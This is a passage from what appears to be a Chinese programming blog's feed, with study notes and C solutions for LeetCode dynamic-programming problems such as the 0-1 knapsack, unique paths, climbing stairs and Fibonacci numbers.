    <url>/2024/03/09/%E5%88%86%E5%89%B2%E7%AD%89%E5%92%8C%E5%AD%90%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/partition-equal-subset-sum/</p><p>这题我一开始的思路是先排序，再用二分法分别计算左右两个子数组的元素和，后来发现对于类似于<code>[1, 1, 2, 2]</code>这样的数组无法判断。</p><p><strong>代码随想录</strong>使用的是0-1背包问题的方法，思路如下：</p><ul><li>先计算整个数组元素之和<code>sum</code></li><li>然后判断<code>sum/2</code>是否为偶数，若为奇数则直接返回<code>false</code>，否则将<code>sum/2</code>作为背包最大容量</li><li><code>dp[i][j]</code>表示的是前<code>i</code>个元素在剩余空间为<code>j</code>的背包中的最大价值</li><li>初始化：第一行和第一列初始化为0</li><li>从<code>dp[1][1]</code>开始遍历，代码基本与0-1背包相同</li><li>最后判断<code>dp[numsSize][sum/2]</code>所能装的最大值是否等于<code>sum/2</code>，若等于则返回<code>true</code></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> {</span><br><span class="line">    <span class="keyword">if</span>(a&gt;b)</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">}</span><br><span class="line"><span class="type">bool</span> <span class="title function_">canPartition</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span>{</span><br><span class="line">    <span class="keyword">if</span>(numsSize&lt;=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;numsSize; i++) {</span><br><span class="line">        sum+=nums[i];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(sum%<span class="number">2</span>!=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">int</span> contain = sum/<span class="number">2</span>; <span class="comment">//背包容量为sum/2</span></span><br><span class="line">    <span class="type">int</span> dp[numsSize+<span class="number">1</span>][sum/<span class="number">2</span>+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;=numsSize; i++) <span class="comment">//初始化</span></span><br><span class="line">        dp[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;=sum/<span class="number">2</span>; i++)  <span class="comment">//初始化</span></span><br><span class="line">        dp[<span class="number">0</span>][i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=numsSize; i++) {</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;=sum/<span class="number">2</span>; j++) {</span><br><span class="line">            <span class="keyword">if</span>(j &lt; nums[i<span class="number">-1</span>])</span><br><span class="line">                dp[i][j] = dp[i<span class="number">-1</span>][j];</span><br><span class="line">            <span class="keyword">else</span>  <span class="comment">//物品所占空间为nums[i]，价值也为nums[i]</span></span><br><span class="line">                dp[i][j] = max(dp[i<span class="number">-1</span>][j], dp[i<span class="number">-1</span>][j-nums[i<span class="number">-1</span>]]+nums[i<span class="number">-1</span>]);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(dp[numsSize][sum/<span class="number">2</span>]==sum/<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0-1背包</title>
    <link href="/2024/03/09/01%E8%83%8C%E5%8C%85/"/>
    <url>/2024/03/09/01%E8%83%8C%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://kamacoder.com/problempage.php?pid=1046</p><p>0-1背包详解：https://www.hello-algo.com/chapter_dynamic_programming/knapsack_problem/</p><p>0-1背包中的“0-1”的意思为当前物品只有两种状态——“选择”或“不选择”。先判断第i个物品是否装入背包，再推断出递推式。</p><ul><li><p>物品<code>i</code>的所占空间大小为<code>weight[i-1]</code>，价值为<code>value[i-1]</code></p></li><li><p>物品<code>i</code>是否装入背包：若<code>weight[i-1]</code>大于背包当前剩余空间，则无法放入；若小于等于背包当前剩余空间，则需要判断是<strong>放入物品i的背包价值大</strong>还是<strong>不放入物品i的背包价值大</strong></p><blockquote><p>这里有个疑惑，显而易见肯定是放入物品的背包价值更大，为什么还要比较？</p><p>但其实这里两个操作的前提是不一样的，即这两个操作对应的<strong>背包状态不同</strong>，不能直接认为放入物品的背包价值更大。</p></blockquote></li><li><p>现在就能确定<code>dp[i][j]</code>的意义了，<code>dp[i][j]</code>表示前<code>i</code>个物品在剩余空间为<code>j</code>的背包中的最大价值</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp[i][j] = max(dp[i<span class="number">-1</span>][j], dp[i<span class="number">-1</span>][j - weight[i<span class="number">-1</span>]] + value[i<span class="number">-1</span>]</span><br></pre></td></tr></tbody></table></figure></li><li><p>初始化：<strong>第一行</strong>（<code>dp[0][j]</code>，表示放入0个物品，所以价值为0）和<strong>第一列</strong>（<code>dp[i][0]</code>，表示背包空间为0，无法放入物品，所以价值为0）需要初始化为0</p></li><li><p>遍历：从<code>dp[1][1]</code>开始遍历，表示（背包空间为1，第1个物品选择/不选择）背包最大价值</p></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> {</span><br><span class="line">    <span class="keyword">if</span>(a&gt;b)</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">packet</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span>* weight, <span class="type">int</span>* value)</span> {</span><br><span class="line">    <span class="type">int</span> dp[M+<span class="number">1</span>][N+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;=M; i++) {</span><br><span class="line">        dp[i][<span class="number">0</span>] = <span class="number">0</span>; <span class="comment">//将第一列设为0</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;=N; i++) {</span><br><span class="line">        dp[<span class="number">0</span>][i] = <span class="number">0</span>; <span class="comment">//将第一行设为0</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=M; i++) { </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;=N; j++ ) {</span><br><span class="line">            <span class="keyword">if</span>(j&lt;weight[i<span class="number">-1</span>])</span><br><span class="line">                dp[i][j] = dp[i<span class="number">-1</span>][j];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                dp[i][j] = max(dp[i<span class="number">-1</span>][j], dp[i<span class="number">-1</span>][j - weight[i<span class="number">-1</span>]] + value[i<span class="number">-1</span>]);</span><br><span class="line">            </span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> dp[M][N];</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="type">int</span> M; <span class="comment">//物品数量</span></span><br><span class="line">    <span class="type">int</span> N; <span class="comment">//背包空间</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;M, &amp;N);</span><br><span class="line">    <span class="type">int</span> weight[M];</span><br><span class="line">    <span class="type">int</span> value[M];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;M; i++) {</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;weight[i]); <span class="comment">//初始化物品所占空间大小</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;M; i++) {</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;value[i]); <span class="comment">//初始化每个物品价值</span></span><br><span class="line">    }</span><br><span class="line">    <span class="type">int</span> most_value = packet(M, N, weight, value);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, most_value);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>不同的二叉搜索树</title>
    <link href="/2024/03/08/%E4%B8%8D%E5%90%8C%E7%9A%84%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/"/>
    <url>/2024/03/08/%E4%B8%8D%E5%90%8C%E7%9A%84%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/unique-binary-search-trees</p><p>这题的难点在于找递推式，一开始我是看能不能通过节点数对应的二叉搜索树的种数找出规律，但是没发现规律。</p><p>想了一会准备从二叉搜索树的性质入手，假设给定节点值<code>1, 2, 3, 4, 5, 6</code>，每次取不同的值作为根节点，则每次划分的左右子树包含的节点数不同。</p><p>先选定<code>1</code>作为根节点，根据左右子树计算二叉搜索树的种数，即将<strong>左子树种类数乘以右子树种类树</strong>；然后以<code>2</code>为根节点计算，以此类推，同时<strong>累加</strong>以不同数值为根节点 所计算出的二叉搜索树种数，得到结果。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">numTrees</span><span class="params">(<span class="type">int</span> n)</span> {</span><br><span class="line">    <span class="type">int</span> dp[n+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>; <span class="comment">//相当于子树为空</span></span><br><span class="line">    dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>; i&lt;=n; i++) {</span><br><span class="line">        dp[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;=i; j++) {</span><br><span class="line">            dp[i] += dp[j<span class="number">-1</span>] * dp[i-j];</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> dp[n];</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>不同路径</title>
    <link href="/2024/03/08/%E4%B8%8D%E5%90%8C%E8%B7%AF%E5%BE%84/"/>
    <url>/2024/03/08/%E4%B8%8D%E5%90%8C%E8%B7%AF%E5%BE%84/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/unique-paths/</p><p>这题很容易就能确定dp的物理意义，不过这题的dp是二维数组。</p><ul><li><p><code>dp[i][j]</code>：到达坐标<code>(i, j)</code>对应的路劲个数</p></li><li><p>递推公式：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp[i][j] = dp[i<span class="number">-1</span>][j] + dp[i][j<span class="number">-1</span>];</span><br></pre></td></tr></tbody></table></figure></li><li><p>初始化：第一行和第一列上的坐标都只有一条路径能够到达</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;m; i++) { <span class="comment">//第一列坐标路径均设为1</span></span><br><span class="line">    dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j&lt;n; j++) { <span class="comment">//第一行坐标路径均设为1</span></span><br><span class="line">    dp[<span class="number">0</span>][j] = <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>遍历顺序：从<code>i=1, j=1</code>开始遍历</p></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">uniquePaths</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n)</span> {</span><br><span class="line">    <span class="type">int</span> dp[m][n];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;m; i++) {</span><br><span class="line">        dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j&lt;n; j++) {</span><br><span class="line">        dp[<span class="number">0</span>][j] = <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;m; i++) {</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;n; j++) {</span><br><span class="line">            dp[i][j] = dp[i<span class="number">-1</span>][j] + dp[i][j<span class="number">-1</span>];</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> dp[m<span class="number">-1</span>][n<span class="number">-1</span>];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用最小花费爬楼梯</title>
    <link href="/2024/03/08/%E4%BD%BF%E7%94%A8%E6%9C%80%E5%B0%8F%E8%8A%B1%E8%B4%B9%E7%88%AC%E6%A5%BC%E6%A2%AF/"/>
    <url>/2024/03/08/%E4%BD%BF%E7%94%A8%E6%9C%80%E5%B0%8F%E8%8A%B1%E8%B4%B9%E7%88%AC%E6%A5%BC%E6%A2%AF/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/min-cost-climbing-stairs/</p><p>这题看了一会没什么思路，直接参考代码随想录，最关键的一步就是确定递推公式</p><ul><li><p><code>dp[i]</code>：到达第i层需要花费的最小费用</p></li><li><p>递推公式：dp[i]的值等于<strong>dp[i-1]加上当前层的费用</strong>或<strong>dp[i-2]加上当前层的费用</strong></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp[i] = min(dp[i<span class="number">-1</span>]+cost[i<span class="number">-1</span>], dp[i<span class="number">-2</span>]+cost[i<span class="number">-2</span>])</span><br></pre></td></tr></tbody></table></figure></li><li><p>初始化：根据题目，从下标<code>0</code>和<code>1</code>开始不需要花费，因此<code>dp[0] = dp[1] = 0</code></p></li><li><p>遍历顺序：从下标<code>2</code>开始</p></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">minCostClimbingStairs</span><span class="params">(<span class="type">int</span>* cost, <span class="type">int</span> costSize)</span> {</span><br><span class="line">    <span class="type">int</span>  dp[costSize+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    dp[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>; i&lt;=costSize; i++) {</span><br><span class="line">        dp[i] = dp[i<span class="number">-1</span>] + cost[i<span class="number">-1</span>] &lt; dp[i<span class="number">-2</span>]+cost[i<span class="number">-2</span>] ? dp[i<span class="number">-1</span>] + cost[i<span class="number">-1</span>] : dp[i<span class="number">-2</span>]+cost[i<span class="number">-2</span>];</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> dp[costSize];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>爬楼梯</title>
    <link href="/2024/03/08/%E7%88%AC%E6%A5%BC%E6%A2%AF/"/>
    <url>/2024/03/08/%E7%88%AC%E6%A5%BC%E6%A2%AF/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/climbing-stairs/</p><ul><li><p><code>dp[i]</code>：表示第<code>i</code>层楼梯共有<code>dp[i]</code>种方法</p></li><li><p>递推公式：<code>dp[i]</code>可由<code>dp[i-1]</code>和<code>dp[i-2]</code>推出，即一次爬一个台阶或一次爬两个台阶</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp[i] = dp[i<span class="number">-1</span>] + dp[i<span class="number">-2</span>]</span><br></pre></td></tr></tbody></table></figure></li><li><p>初始化：<code>dp[0] = 0</code>(这一步可省略);<code>dp[1] = 1</code>; <code>dp[2] = 2</code>;</p></li><li><p>遍历顺序：从<code>dp[3]</code>开始遍历</p></li></ul><p>代码如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">climbStairs</span><span class="params">(<span class="type">int</span> n)</span> {</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    <span class="type">int</span> dp[n+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">3</span>; i&lt;=n; i++) {</span><br><span class="line">        dp[i] = dp[i<span class="number">-1</span>] + dp[i<span class="number">-2</span>];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> dp[n];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>若使用递归方法，代码如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">climbStairs</span><span class="params">(<span class="type">int</span> n)</span> {</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(n&lt;<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> climbStairs(n<span class="number">-1</span>)+climbStairs(n<span class="number">-2</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>斐波那契数</title>
    <link href="/2024/03/07/%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0/"/>
    <url>/2024/03/07/%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/fibonacci-number</p><p>正式进入<strong>动态规划（DP）</strong>章节，每一个状态都是由上一个状态推导出来的。根据代码随想录的5个步骤解题：</p><ol type="1"><li>确定dp数组（dp table）以及下标的含义</li><li>确定递推公式</li><li>dp数组如何初始化</li><li>确定遍历顺序</li><li>举例推导dp数组</li></ol><p>在这题中，dp[i]表示的是下标<code>i</code>对应的斐波那契数值，题目已给出递推公式和初始化（前两个数），遍历顺序就按照下标递增的顺序。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> n)</span>{</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">1</span>) <span class="comment">//当下标小于等于1时，不用通过递推公式计算，直接返回</span></span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    <span class="type">int</span> dp[n+<span class="number">1</span>]; <span class="comment">//注意数组大小，从0~n</span></span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span>; <span class="comment">//初始化</span></span><br><span class="line">    dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>; i&lt;=n; i++) {</span><br><span class="line">        dp[i] = dp[i<span class="number">-1</span>] + dp[i<span class="number">-2</span>]; <span class="comment">//递推公式</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> dp[n];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>上述代码的时间和空间复杂度都是O(n)，下面是优化后的代码：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> n)</span>{</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">1</span>) <span class="comment">//当下标小于等于1时，不用通过递推公式计算，直接返回</span></span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    <span class="type">int</span> dp[n+<span class="number">1</span>]; <span class="comment">//注意数组大小，从0~n</span></span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span>; <span class="comment">//初始化</span></span><br><span class="line">    dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>; i&lt;=n; i++) {</span><br><span class="line">        <span class="type">int</span> sum = dp[<span class="number">0</span>] + dp[<span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = dp[<span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">1</span>] = sum; <span class="comment">//递推公式</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> dp[<span class="number">1</span>];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>上述代码的时间复杂度为O(n)，空间复杂度为O(1)。</p><p>这题我的第一个思路就是直接使用<strong>递归</strong>解决，不过时间复杂度较大，为O(2<sup>n</sup>)</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> n)</span>{</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span> || n==<span class="number">0</span>) <span class="comment">//终止条件</span></span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    <span class="keyword">return</span> fib(n<span class="number">-1</span>)+fib(n<span class="number">-2</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>单调递增的数字</title>
    <link href="/2024/03/07/%E5%8D%95%E8%B0%83%E9%80%92%E5%A2%9E%E7%9A%84%E6%95%B0%E5%AD%97/"/>
    <url>/2024/03/07/%E5%8D%95%E8%B0%83%E9%80%92%E5%A2%9E%E7%9A%84%E6%95%B0%E5%AD%97/</url>
    
